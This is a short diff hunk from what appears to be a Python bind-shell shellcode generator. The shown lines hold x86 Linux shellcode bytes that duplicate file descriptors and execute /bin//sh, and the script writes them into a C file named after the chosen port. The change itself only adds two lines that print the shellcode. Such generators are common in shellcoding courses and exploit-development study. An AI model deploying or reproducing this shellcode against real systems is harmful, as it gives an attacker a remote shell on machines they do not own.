@@ -45,6 +45,9 @@ def main(argv):
 	Shellcode +="\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3" 
 	Shellcode +="\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
 	
+	print("Shellcode:")
+	print(Shellcode)
+
 	filename="BindShell-" + str(port) + ".c"
 	print("Saving to " + filename)
  
